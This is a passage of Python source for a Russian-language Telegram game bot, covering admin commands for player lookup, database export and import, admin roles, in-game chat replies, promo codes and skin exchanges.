    text = f"• Найден игрок в игре: {user_data.get('nick', '?')}\n"
    text += f"- Айди: {player_id}\n"
    data_field = user_data.get('data', {})
    if isinstance(data_field, dict):
        data_field = json.dumps(data_field, ensure_ascii=False)
    text += f"- Data: {data_field}\n"
    eq_inv = eq_data.get('eq', {})
    if isinstance(eq_inv, dict):
        eq_inv = json.dumps(eq_inv, ensure_ascii=False)
    text += f"- Инвентарь ⤵\n{eq_inv}\n"
    text += f"- Описание: {eq_data.get('description', 'нет')}\n"
    text += f"- Аватар: {user_data.get('avatar', 'нет')}\n"
    text += f"- Рамка: {user_data.get('frame', 'нет')}\n"
    text += f"- Страна: {user_data.get('country', 'нет')}\n"
    text += f"- Премиум: {'Да' if user_data.get('premium', False) else 'Нет'}\n"
    text += f"- Версия: {user_data.get('version', '?')}\n"
    blocked = user_data.get('blocked', [])
    if isinstance(blocked, list):
        blocked = ', '.join(blocked) if blocked else 'нет'
    text += f"- Заблокированные пользователи: {blocked}\n"

    players = load_json(PLAYERS_FILE, {})
    registered = False
    bot_data = None
    tid = None
    for t, pdata in players.items():
        if pdata.get('game_id') == player_id:
            registered = True
            bot_data = pdata
            tid = t
            break

    text += f"\nЗарегестрирован ли игрок в боте? {'✅ Да' if registered else '❌ Нет'}\n"
    if registered:
        text += f"Информация о зарегестрированном игроке ⤵\n"
        text += f"- Telegram ID: {tid}\n"
        text += f"- Ник в боте: {bot_data.get('game_nick', 'неизвестно')}\n"
        text += f"- Монеты: {format_coins(bot_data.get('coins', 0))}\n"
        text += f"- Токены: {bot_data.get('tokens', 0)}\n"
        text += f"- Друзей: {len(bot_data.get('friends', []))}\n"
        text += f"- Рефералов: {bot_data.get('referral_count', 0)}\n"
        keyboard = [[InlineKeyboardButton("🍪 Инвентарь (бот)", callback_data=f"admin_inventory|{tid}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text)

async def admin_inventory_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    if len(data) < 2:
        await query.edit_message_text("Ошибка: неверные данные")
        return
    target_id = data[1]
    context.user_data['last_inventory_target'] = target_id
    await show_inventory(update, context, target_id, query.from_user.id, page=0, mode="admin")

# ============= КОМАНДЫ ДЛЯ РАБОТЫ С БАЗОЙ ДАННЫХ =============
async def bd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "Использование:\n"
            "/bd download - скачать всю базу данных\n"
            "/bd player <ник> - скачать данные игрока\n"
            "/bd date <YYYY.MM.DD> - скачать игроков за дату\n"
            "/bd upload - загрузить новую базу данных"
        )
        return

    subcmd = args[0].lower()
    if subcmd == "download":
        await bd_download(update, context)
    elif subcmd == "player" and len(args) >= 2:
        await bd_player(update, context, args[1])
    elif subcmd == "date" and len(args) >= 2:
        await bd_date(update, context, args[1])
    elif subcmd == "upload":
        await bd_upload_start(update, context)
    else:
        await update.message.reply_text("Неверная подкоманда. Используйте /bd для справки.")

async def bd_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not os.path.exists(PLAYERS_FILE):
        await update.message.reply_text("❌ Файл базы данных не найден.")
        return
    try:
        with open(PLAYERS_FILE, "rb") as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename="players.json"
            )
        update_player_stats(update.effective_user.id, update.effective_user)
    except Exception as e:
        logger.error(f"Ошибка при отправке базы: {e}")
        await update.message.reply_text(f"❌ Ошибка при отправке: {e}")

async def bd_player(update: Update, context: ContextTypes.DEFAULT_TYPE, nick: str):
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден.")
        return
    player_data = {target_id: players[target_id]}
    temp_file = f"temp_player_{target_id}.json"
    try:
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(player_data, f, indent=2, ensure_ascii=False)
        with open(temp_file, "rb") as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=f"player_{nick}.json"
            )
    except Exception as e:
        logger.error(f"Ошибка при отправке игрока: {e}")
        await update.message.reply_text(f"❌ Ошибка: {e}")
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)
    update_player_stats(update.effective_user.id, update.effective_user)

async def bd_date(update: Update, context: ContextTypes.DEFAULT_TYPE, date_str: str):
    if not re.match(r'\d{4}\.\d{2}\.\d{2}', date_str):
        await update.message.reply_text("❌ Неверный формат даты. Используйте YYYY.MM.DD")
        return
    players = load_json(PLAYERS_FILE, {})
    result = {}
    for tid, pdata in players.items():
        reg_date = pdata.get('registered_at', '').split(' ')[0]
        reg_date_fixed = reg_date.replace('-', '.')
        if reg_date_fixed == date_str:
            result[tid] = pdata
    if not result:
        await update.message.reply_text("❌ За эту дату нет зарегистрированных игроков.")
        return
    temp_file = f"temp_date_{date_str.replace('.', '_')}.json"
    try:
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
        with open(temp_file, "rb") as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=f"players_{date_str}.json"
            )
    except Exception as e:
        logger.error(f"Ошибка при отправке по дате: {e}")
        await update.message.reply_text(f"❌ Ошибка: {e}")
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)
    update_player_stats(update.effective_user.id, update.effective_user)

async def bd_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['awaiting_bd_upload'] = True
    await update.message.reply_text(
        "📁 Вы хотите загрузить базу данных игроков.\n"
        "Пришлите файл для загрузки, название файла должно быть \"players.json\"."
    )

async def handle_bd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    if not context.user_data.get('awaiting_bd_upload'):
        return False
    if not is_admin_or_owner(user_id):
        await update.message.reply_text("⛔ Недостаточно прав")
        context.user_data['awaiting_bd_upload'] = False
        return True

    document = update.message.document
    if not document:
        await update.message.reply_text("❌ Пожалуйста, отправьте файл.")
        return True

    if not document.file_name.endswith('.json'):
        await update.message.reply_text("❌ Файл должен быть JSON.")
        return True

    file = await context.bot.get_file(document.file_id)
    temp_file = "temp_upload.json"
    try:
        await file.download_to_drive(temp_file)
        with open(temp_file, 'r', encoding='utf-8') as f:
            new_data = json.load(f)
        if not isinstance(new_data, dict):
            raise ValueError("Корневой элемент должен быть объектом")
        save_json(PLAYERS_FILE, new_data)
        await update.message.reply_text("✅ База данных успешно обновлена.")
    except Exception as e:
        logger.error(f"Ошибка при обработке файла: {e}")
        await update.message.reply_text(f"❌ Ошибка при обработке файла: {e}")
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)
    context.user_data['awaiting_bd_upload'] = False
    update_player_stats(user_id)
    return True

# ============= УПРАВЛЕНИЕ АДМИНАМИ =============
def parse_time(expiry_str: str) -> Optional[datetime]:
    if not expiry_str:
        return None
    num = int(expiry_str[:-1])
    unit = expiry_str[-1]
    if unit == 'м' and expiry_str.endswith('мес'):
        return datetime.now() + timedelta(days=30*num)
    elif unit == 'м':
        return datetime.now() + timedelta(minutes=num)
    elif unit == 'д':
        return datetime.now() + timedelta(days=num)
    elif unit == 'ч':
        return datetime.now() + timedelta(hours=num)
    return None

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Только владелец")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Использование: /addadmin <telegram_id> [срок]\nПример: /addadmin 123456789 30д")
        return
    target_id = args[0]
    expiry_str = args[1] if len(args) > 1 else None
    players = load_json(PLAYERS_FILE, {})
    if target_id not in players:
        await update.message.reply_text("❌ Пользователь не найден")
        return
    expiry = parse_time(expiry_str) if expiry_str else None
    players[target_id]["role"] = "admin"
    players[target_id]["admin_expires"] = expiry.isoformat() if expiry else None
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ Админ {target_id} добавлен")
    update_player_stats(update.effective_user.id, update.effective_user)

async def deladmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Только владелец")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Использование: /deladmin <telegram_id>")
        return
    target_id = args[0]
    players = load_json(PLAYERS_FILE, {})
    if target_id not in players:
        await update.message.reply_text("❌ Пользователь не найден")
        return
    players[target_id]["role"] = "user"
    players[target_id]["admin_expires"] = None
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ Админ {target_id} удалён")
    update_player_stats(update.effective_user.id, update.effective_user)

# ============= HELP (ПОЛНЫЙ, СО ВСЕМИ КОМАНДАМИ) =============
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    role = get_player_role(user_id)
    if role == "user":
        text = (
            "📋 Доступные команды (игрок):\n\n"
            "/start - главное меню / регистрация\n"
            "/profile - показать профиль\n"
            "/money - показать баланс монет\n"
            "/tokens - показать баланс токенов\n"
            "/myitems - показать инвентарь\n"
            "/help - это сообщение\n\n"
            "Для доступа к админ-командам нужна роль администратора."
        )
    else:
        text = (
            "📋 Доступные команды (администратор):\n\n"
            "Мониторинг:\n"
            "/monitor - запустить мониторинг чатов\n"
            "/status - статус мониторинга\n"
            "/download <канал> [количество] - загрузить последние сообщения из канала\n"
            "/channels - показать текущие привязки каналов\n"
            "/setlink <канал> <ссылка> - изменить ссылку для канала\n"
            "/setid <новый ID> - сменить ID отправителя в игре\n"
            "/showid - показать текущий ID отправителя\n"
            "/senderprofile - настройки профиля отправителя трейда\n\n"
            "Монеты:\n"
            "/money - показать свой баланс\n"
            "/money give <ник> <количество> - выдать монеты игроку\n"
            "/money set <ник> <количество> - установить баланс игрока\n"
            "/money take <ник> <количество> - забрать монеты у игрока\n\n"
            "Токены:\n"
            "/tokens - показать свои токены\n"
            "/tokens give <ник> <количество> - выдать токены игроку\n"
            "/tokens set <ник> <количество> - установить токены\n"
            "/tokens take <ник> <количество> - забрать токены\n\n"
            "Трейды:\n"
            "/block trade - запустить блокировку трейдов\n"
            "/block trade stop - остановить блокировку\n"
            "/block trade status - статистика заблокированных трейдов\n"
            "/skin download - скачать JSON с информацией о заблокированных скинах\n\n"
            "Парсер аккаунтов:\n"
            "/parsing start - запустить парсер\n"
            "/parsing stop - остановить парсер\n"
            "/parsing status - статус парсера\n\n"
            "NUKE и выдача характеристик:\n"
            "/nuke <id> - сбросить данные игрока (по ID или ответом на сообщение)\n"
            "/send all <id> - выдать максимальные характеристики игроку\n\n"
            "Инвентарь:\n"
            "/skin add <ник> <строка_скина1>,<строка_скина2>... - выдать скины игроку\n"
            "/inventory <ник> - просмотреть инвентарь игрока\n"
            "/myitems - свой инвентарь\n\n"
            "Управление админами:\n"
            "/addadmin <telegram_id> [срок] - добавить админа\n"
            "/deladmin <telegram_id> - удалить админа\n"
            "/ban <ник> - забанить игрока в боте\n"
            "/unban <ник> - разбанить игрока\n\n"
            "База данных:\n"
            "/bd download - скачать всю базу данных\n"
            "/bd player <ник> - скачать данные игрока\n"
            "/bd date <YYYY.MM.DD> - скачать игроков за дату\n"
            "/bd upload - загрузить новую базу данных\n\n"
            "Рассылка:\n"
            "/everyone <текст> - отправить сообщение всем пользователям\n"
            "/everyone delete <код> - удалить ранее отправленное сообщение\n"
            "/everyone info <код> - информация о рассылке\n\n"
            "Промокоды:\n"
            "/promo create <название> - создать промокод\n"
            "/promo delete <название> - удалить промокод\n"
            "/promo status <название> - информация о промокоде\n"
            "/promo list - список всех промокодов\n\n"
            "Поиск игрока по ID:\n"
            "/id <айди игрока> - получить информацию об игроке в игре и статус регистрации в боте\n\n"
            "Управление ботом:\n"
            "/bot offline - выключить бота для игроков (админы и владелец имеют доступ)\n"
            "/bot online - включить бота для игроков\n"
            "/bot status - показать количество зарегистрировавшихся сегодня\n\n"
            "Остановка задач:\n"
            "/stop <имя задачи> - остановить задачу (Мониторинг, TradeBlocker)\n\n"
            "Общие:\n"
            "/start - главное меню\n"
            "/profile - профиль\n"
            "/help - это сообщение"
        )
    await update.message.reply_text(text)
    update_player_stats(update.effective_user.id, update.effective_user)

# ============= ФУНКЦИЯ ОТПРАВКИ ОТВЕТА ИГРОКУ =============
async def send_reply(update: Update, context: ContextTypes.DEFAULT_TYPE, nick: str, channel: str, user_text: str, lang: str = None):
    chat_id = update.effective_chat.id
    sender_id = sender_ids.get(chat_id, DEFAULT_SENDER_ID)

    if channel == "PREMIUM" and lang:
        if lang == "RU":
            prefix = "ответ игроку:"
        else:
            prefix = "reply to player:"
    else:
        if channel == "RU":
            prefix = "ответ игроку:"
        elif channel == "UA":
            prefix = "відповідь гравцеві:"
        else:
            prefix = "reply to player:"

    reply_text = f"{prefix} {nick} - {user_text}"
    success = send_chat_message(sender_id, reply_text, channel)

    if success:
        await update.message.reply_text(f"✅ Ответ отправлен игроку {nick} в канал {channel}")
    else:
        await update.message.reply_text("❌ Не удалось отправить ответ в игру.")
    update_player_stats(update.effective_user.id, update.effective_user)

# ============= ГЛАВНЫЙ ОБРАБОТЧИК СООБЩЕНИЙ =============
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if is_banned(user_id):
        await update.message.reply_text("❌ Вы были заблокированы")
        return

    if not bot_online and not is_admin_or_owner(user_id):
        await update.message.reply_text("❗Тех. Работы. Попробуйте позднее.\nВсе новости - t.me/EfezGame")
        return

    if context.user_data.get('awaiting_promo_time'):
        match = re.match(r'(\d+)\s*(мин|ч|час|д|день|мес)', text.lower())
        if match:
            value = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit.startswith('мин'):
                expires = now + timedelta(minutes=value)
            elif unit.startswith('ч'):
                expires = now + timedelta(hours=value)
            elif unit.startswith('д'):
                expires = now + timedelta(days=value)
            elif unit.startswith('мес'):
                expires = now + timedelta(days=30*value)
            else:
                await update.message.reply_text("Неверный формат")
                return
            context.user_data['promo_creating']['expires_at'] = expires.isoformat()
            del context.user_data['awaiting_promo_time']
            await update.message.reply_text(f"✅ Время установлено: {expires.strftime('%Y-%m-%d %H:%M:%S')}")
            await show_promo_edit_menu(update, context)
        else:
            await update.message.reply_text("Неверный формат. Пример: 2ч, 30мин, 1д")
        return

    if context.user_data.get('awaiting_promo_uses'):
        try:
            uses = int(text)
            context.user_data['promo_creating']['max_uses'] = uses
            del context.user_data['awaiting_promo_uses']
            await update.message.reply_text(f"✅ Максимальное количество использований: {uses}")
            await show_promo_edit_menu(update, context)
        except ValueError:
            await update.message.reply_text("Введите число")
        return

    if context.user_data.get('awaiting_promo_coins'):
        try:
            amount = int(text)
            if 'rewards' not in context.user_data['promo_creating']:
                context.user_data['promo_creating']['rewards'] = []
            context.user_data['promo_creating']['rewards'].append({'type': 'coins', 'amount': amount})
            del context.user_data['awaiting_promo_coins']
            await update.message.reply_text(f"✅ Монеты {amount} добавлены в награды")
            await show_promo_edit_menu(update, context)
        except ValueError:
            await update.message.reply_text("Введите число")
        return

    if context.user_data.get('awaiting_promo_tokens'):
        try:
            amount = int(text)
            if 'rewards' not in context.user_data['promo_creating']:
                context.user_data['promo_creating']['rewards'] = []
            context.user_data['promo_creating']['rewards'].append({'type': 'tokens', 'amount': amount})
            del context.user_data['awaiting_promo_tokens']
            await update.message.reply_text(f"✅ Токены {amount} добавлены в награды")
            await show_promo_edit_menu(update, context)
        except ValueError:
            await update.message.reply_text("Введите число")
        return

    if context.user_data.get('awaiting_promo_skins'):
        raw_items = [s.strip().strip('"') for s in text.split(',') if s.strip()]
        items = []
        for raw in raw_items:
            try:
                item_data = parse_skin_string(raw)
                items.append(item_data)
            except Exception as e:
                await update.message.reply_text(f"Ошибка в строке {raw}: {e}")
                return
        if 'rewards' not in context.user_data['promo_creating']:
            context.user_data['promo_creating']['rewards'] = []
        context.user_data['promo_creating']['rewards'].append({'type': 'skins', 'items': items})
        del context.user_data['awaiting_promo_skins']
        await update.message.reply_text(f"✅ Добавлено скинов: {len(items)}")
        await show_promo_edit_menu(update, context)
        return

    if user_id in awaiting_activate_promo:
        await handle_activate_promo(update, context)
        return
    if user_id in awaiting_view_profile:
        await handle_view_other_profile(update, context)
        return

    if context.user_data.get('awaiting_bd_upload'):
        if await handle_bd_upload(update, context):
            return

    if user_id in awaiting_friend_add:
        await handle_friend_add(update, context)
        return
    if user_id in awaiting_search:
        await handle_find_player(update, context)
        return

    if text in ["👤 Меню игрока", "⚙️ Админ-меню", "👥 Друзья", "⚡ Реферальная система", "🍪 Инвентарь", "🔄 Обмены", "📤 Исходящие", "📥 Входящие", "🧟 Добавить друга", "👤 Список друзей", "🕓 Активные запросы", "◀️ Назад в профиль", "👤 Мой профиль (админ)", "🔍 Найти игрока", "◀️ Назад", "⚙️ Настройки", "🎫 Промокоды", "✅ Активировать промокод", "🔍 Посмотреть чужой профиль", "⏱ Время промокода", "🔢 Количество использований", "💰 Монеты", "💎 Токены", "🔫 Скины", "✅ Готово", "✅ ВЫВЕСТИ СКИН", "◀️ Назад к другу"]:
        if not is_registered(user_id) and text not in ["👤 Меню игрока", "⚙️ Админ-меню", "✅ ВЫВЕСТИ СКИН"]:
            await update.message.reply_text("❌ Сначала зарегистрируйтесь через /start")
            return
        await handle_reply_keyboard(update, context)
        return

    if await handle_unblock_reply(update, context):
        return

    if not is_registered(user_id):
        return

    if update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        if replied_msg.from_user.id == context.bot.id:
            nick = extract_nick_from_text(replied_msg.text)
            if not nick:
                await update.message.reply_text("❌ Не удалось извлечь ник игрока.")
                return
            thread_id = replied_msg.message_thread_id
            game_channel = thread_to_channel.get(thread_id) if thread_id else None
            if not game_channel:
                await update.message.reply_text("❌ Не удалось определить канал.")
                return
            if game_channel == "PREMIUM":
                awaiting_lang[user_id] = {
                    'nick': nick,
                    'channel': game_channel,
                    'text': text,
                    'original_msg_id': replied_msg.message_id
                }
                await update.message.reply_text("Выберите язык ответа: RU или US")
            else:
                await send_reply(update, context, nick, game_channel, text)
            update_player_stats(user_id)
            return

    if update.message.message_thread_id and update.message.message_thread_id in thread_to_channel:
        game_channel = thread_to_channel[update.message.message_thread_id]
        sender_id = sender_ids.get(update.effective_chat.id, DEFAULT_SENDER_ID)
        success = send_chat_message(sender_id, text, game_channel)
        if success:
            await update.message.reply_text(f"✅ Сообщение отправлено в канал {game_channel}")
        else:
            await update.message.reply_text("❌ Не удалось отправить сообщение в игру.")
        update_player_stats(user_id)
        return

    if user_id in awaiting_lang:
        data = awaiting_lang[user_id]
        choice = text.strip().upper()
        if choice in ("RU", "US"):
            await send_reply(update, context, data['nick'], data['channel'], data['text'], lang=choice)
            del awaiting_lang[user_id]
        else:
            await update.message.reply_text("Пожалуйста, выберите RU или US.")
        return



async def edit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    if not update.message.reply_to_message:
        await update.message.reply_text("❌ Ответьте на сообщение, которое хотите отредактировать.")
        return
    if update.message.reply_to_message.from_user.id != context.bot.id:
        await update.message.reply_text("❌ Можно редактировать только свои сообщения.")
        return
    new_text = update.message.text[len('/edit '):].strip()
    if not new_text:
        await update.message.reply_text("❌ Укажите новый текст после команды.")
        return
    try:
        await update.message.reply_to_message.edit_text(new_text)
        await update.message.reply_text("✅ Сообщение отредактировано.")
    except Exception as e:
        await update.message.reply_text(f"❌ Не удалось отредактировать: {e}")


# ============= ПРОФИЛЬ ОТПРАВИТЕЛЯ ТРЕЙДА =============
async def senderprofile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    profile = load_sender_profile_config(SENDER_PROFILE_FILE)
    args = context.args
    if not args:
        await update.message.reply_text(
            format_sender_profile_config(profile) + "\n\n"
            "Команды:\n"
            "/senderprofile show\n"
            "/senderprofile nick <ник>\n"
            "/senderprofile frame <рамка>\n"
            "/senderprofile avatar <аватар>\n"
            "/senderprofile message <сообщение>\n"
            "/senderprofile enabled <true/false>\n"
            "/senderprofile interval <секунды>\n"
            "/senderprofile schedule <true/false>\n"
            "/senderprofile start <HH:MM>\n"
            "/senderprofile end <HH:MM>\n"
            "/senderprofile addnick <ник>\n"
            "/senderprofile delnick <номер>\n"
            "/senderprofile addmsg <сообщение>\n"
            "/senderprofile delmsg <номер>"
        )
        return
    sub = args[0].lower()
    rest = " ".join(args[1:]).strip()
    if sub in ("show", "status"):
        await update.message.reply_text(format_sender_profile_config(profile)); return
    elif sub == "nick":
        profile["main_nick"] = rest
    elif sub == "frame":
        profile["sender_frame"] = rest
    elif sub == "avatar":
        profile["sender_avatar"] = rest
    elif sub == "message":
        profile["main_message"] = rest
    elif sub == "enabled":
        profile["auto_update_enabled"] = rest.lower() in ("true","1","yes","on","да")
    elif sub == "interval":
        try: profile["update_interval_seconds"] = max(10, int(rest))
        except ValueError:
            await update.message.reply_text("❌ interval должен быть числом"); return
    elif sub == "schedule":
        profile["schedule_msk"]["enabled"] = rest.lower() in ("true","1","yes","on","да")
    elif sub == "start":
        if not re.match(r"^\d{2}:\d{2}$", rest):
            await update.message.reply_text("❌ Формат start: HH:MM"); return
        profile["schedule_msk"]["start"] = rest
    elif sub == "end":
        if not re.match(r"^\d{2}:\d{2}$", rest):
            await update.message.reply_text("❌ Формат end: HH:MM"); return
        profile["schedule_msk"]["end"] = rest
    elif sub == "addnick":
        if not rest: await update.message.reply_text("❌ Укажите ник"); return
        profile["nick_cycle"].append(rest)
    elif sub == "delnick":
        try:
            removed = profile["nick_cycle"].pop(int(rest)-1)
            save_sender_profile_config(SENDER_PROFILE_FILE, profile)
            await update.message.reply_text(f"✅ Удалён ник: {removed}"); return
        except Exception:
            await update.message.reply_text("❌ Неверный номер ника"); return
    elif sub == "addmsg":
        if not rest: await update.message.reply_text("❌ Укажите сообщение"); return
        profile["message_cycle"].append(rest)
    elif sub == "delmsg":
        try:
            removed = profile["message_cycle"].pop(int(rest)-1)
            save_sender_profile_config(SENDER_PROFILE_FILE, profile)
            await update.message.reply_text(f"✅ Удалено сообщение: {removed}"); return
        except Exception:
            await update.message.reply_text("❌ Неверный номер сообщения"); return
    else:
        await update.message.reply_text("❌ Неизвестная подкоманда /senderprofile"); return
    save_sender_profile_config(SENDER_PROFILE_FILE, profile)
    await update.message.reply_text("✅ Профиль отправителя обновлён\n\n" + format_sender_profile_config(profile))

# ============= HELP =============

async def exchange_view_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    action = data[1]
    eid = data[2]
    exchanges = load_exchanges()
    if eid not in exchanges:
        await query.edit_message_text("Обмен не найден")
        return
    ex = exchanges[eid]
    _, init_item = get_item_owner(ex['initiator_skin_id'])
    _, target_item = get_item_owner(ex['target_skin_id'])
    text = "♻️ Информация об обмене:\n\n"
    text += "🔹 Предлагает:\n"
    text += format_item_info(init_item)
    text += "\n🔸 Просит:\n"
    text += format_item_info(target_item)
    keyboard = []
    if action == "view_in":
        keyboard.append([InlineKeyboardButton("✅ Принять", callback_data=f"exchange|accept|{eid}"),
                         InlineKeyboardButton("❌ Отклонить", callback_data=f"exchange|decline|{eid}")])
    elif action == "view_out":
        keyboard.append([InlineKeyboardButton("❌ Отменить", callback_data=f"exchange|cancel|{eid}")])
    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="back_to_profile")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# ============= НАСТРОЙКИ =============

async def exchange_view_skin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    exchange_id = data[1]
    side = data[2]

    exchanges = load_exchanges()
    if exchange_id not in exchanges:
        await query.edit_message_text("❌ Обмен не найден")
        return
    exch = exchanges[exchange_id]

    if side == "initiator":
        skin_id = exch['initiator_skin_id']
    else:
        skin_id = exch['target_skin_id']

    _, item = get_item_owner(skin_id)
    if not item:
        await query.edit_message_text("❌ Скин не найден")
        return

    skin_name = get_skin_name(item['skin_code'])
    mod_name = get_modifier_name(item['modifier'])
    stickers = item.get('stickers', [])
    statrak = "Да" if item['modifier'] in (14,16,24,26,34,36,44,46) else "Нет"

    text = f"🔫 Информация о скине\n"
    text += f"• Название: {skin_name}\n"
    text += f"Наклейки:\n"
    for i in range(4):
        sticker = next((s for s in stickers if s['slot'] == i), None)
        if sticker:
            st_name = get_sticker_name(sticker['code'])
            text += f"{i+1}. {st_name}\n"
        else:
            text += f"{i+1}. ❌ Нет\n"
    text += f"• Редкость: {mod_name}\n"
    text += f"• Статрек: {statrak}"

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Назад", callback_data=f"exchange_back|{exchange_id}")]
    ])
    await query.edit_message_text(text, reply_markup=keyboard)

async def exchange_back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    exchange_id = data[1]
    exchanges = load_exchanges()
    if exchange_id not in exchanges:
        await query.edit_message_text("❌ Обмен не найден")
        return
    exch = exchanges[exchange_id]
    user_id = str(query.from_user.id)

    if user_id == exch['initiator_id']:
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔫 Мой скин", callback_data=f"exchange_view_skin|{exchange_id}|initiator"),
                InlineKeyboardButton("🔫 Его скин", callback_data=f"exchange_view_skin|{exchange_id}|target")
            ],
            [InlineKeyboardButton("❌ Отменить", callback_data=f"exchange|cancel|{exchange_id}")]
        ])
        target_nick = get_nick_by_game_id(exch['target_id'])
        text = f"📤 Ваш обмен с пользователем {target_nick}."
    elif user_id == exch['target_id']:
        initiator_nick = get_nick_by_game_id(exch['initiator_id'])
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔫 Мой скин", callback_data=f"exchange_view_skin|{exchange_id}|target"),
                InlineKeyboardButton("🔫 Его скин", callback_data=f"exchange_view_skin|{exchange_id}|initiator")
            ],
            [
                InlineKeyboardButton("✅ Принять", callback_data=f"exchange|accept|{exchange_id}"),
                InlineKeyboardButton("❌ Отклонить", callback_data=f"exchange|decline|{exchange_id}")
            ]
        ])
        text = f"✉️ Вам предложили обмен от {initiator_nick}."
    else:
        await query.edit_message_text("❌ Вы не участник этого обмена")
        return
    await query.edit_message_text(text, reply_markup=keyboard)

async def show_friends_for_exchange(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(user_id)
    if not current_user:
        await update.message.reply_text("❌ Сначала зарегистрируйтесь")
        return

    friends = current_user.get('friends', [])
    if not friends:
        await update.message.reply_text("У вас нет друзей для обмена.")
        return

    inv = load_inventory()
    keyboard = []
    for friend_nick in friends:
        friend_id = get_player_by_nick(friend_nick, players)
        if friend_id:
            friend_items = inv.get(friend_id, [])
            count = len(friend_items)
            button_text = f"{friend_nick} ({count})"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"exchange_friend|{friend_nick}")])
    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="back_to_profile")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Выберите друга для обмена:", reply_markup=reply_markup)

# ============= РЕГИСТРАЦИЯ =============

async def show_friends_for_exchange_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(str(user_id))
    if not current_user:
        await query.edit_message_text("❌ Вы не зарегистрированы")
        return

    friends = current_user.get('friends', [])
    if not friends:
        await query.edit_message_text("У вас нет друзей для обмена.")
        return

    inv = load_inventory()
    keyboard = []
    for friend_nick in friends:
        friend_id = get_player_by_nick(friend_nick, players)
        if friend_id:
            friend_items = inv.get(friend_id, [])
            count = len(friend_items)
            button_text = f"{friend_nick} ({count})"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"exchange_friend|{friend_nick}")])
    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="back_to_profile")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("Выберите друга для обмена:", reply_markup=reply_markup)

async def show_incoming_exchanges(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    exchanges = load_exchanges()
    incoming = {eid: ex for eid, ex in exchanges.items() if ex['target_id'] == user_id and ex['status'] == 'pending'}
    if not incoming:
        await update.message.reply_text("Нет входящих обменов.")
        return
    text = "Вам предложили обмен:\n"
    keyboard = []
    for eid, ex in incoming.items():
        _, init_item = get_item_owner(ex['initiator_skin_id'])
        if init_item:
            skin_name = get_skin_name(init_item['skin_code'])
            mod_name = get_modifier_name(init_item['modifier'])
            button_text = f"{skin_name} - {mod_name}"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"exchange|view_in|{eid}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)


async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("👤 Мой профиль (админ)")],
        [KeyboardButton("🔍 Найти игрока")],
        [KeyboardButton("◀️ Назад")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    if update.callback_query:
